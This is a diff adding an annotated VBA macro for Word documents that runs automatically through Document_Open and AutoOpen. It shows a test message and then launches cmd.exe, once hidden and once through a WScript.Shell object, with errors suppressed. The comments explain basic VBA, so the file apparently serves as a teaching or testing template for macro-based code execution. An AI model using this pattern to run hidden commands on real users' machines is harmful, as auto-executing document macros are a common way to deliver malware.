@@ -1,0 +1,30 @@
+
+'Sub or subroutine, series of statements that do not return a value.
+Sub Document_Open()
+'Opens the Macro (assuming protection is turned off) when the document opens
+    BasicWSH
+End Sub
+
+Sub AutoOpen()
+'Opens the Macro (assuming protection is turned off
+    BasicWSH
+End Sub
+
+Sub BasicWSH()
+    'Displays a Message Box to the user.
+    MsgBox ("Test Message")
+    'Dim or dimension, is used to declare variables. e.g. the below states "str" as a string variable
+    'Variables can be set as String, Range [A1:A10], Worksheet, Boolean, Byte, Integer, Object. (More)
+    Dim str As String
+    str = "cmd.exe"
+    'Of an error occurs, execution continues
+    On Error Resume Next
+    'Shell command executes a command using operating system shell via cmd. Shell (Program,WindowStyle)
+    Shell str, vbHide
+    'Objects can be an application, worksheet or value. The following calls the vshscript object with the .shell property.
+    'Object properties can be found on the internet for each object. e.g. worksheet.delete removes a worksheet.
+    'The CreateObject function is used to create and reference ActiveX objects. ActiveX Objects are automation interfaces.
+    'The Create Object below Creates the Wscript.Shell objects and proceeds to run it with the argument. 1 designates the Windows Style.
+    CreateObject("Wscript.Shell").Run str, 1, False
+    
+End Sub
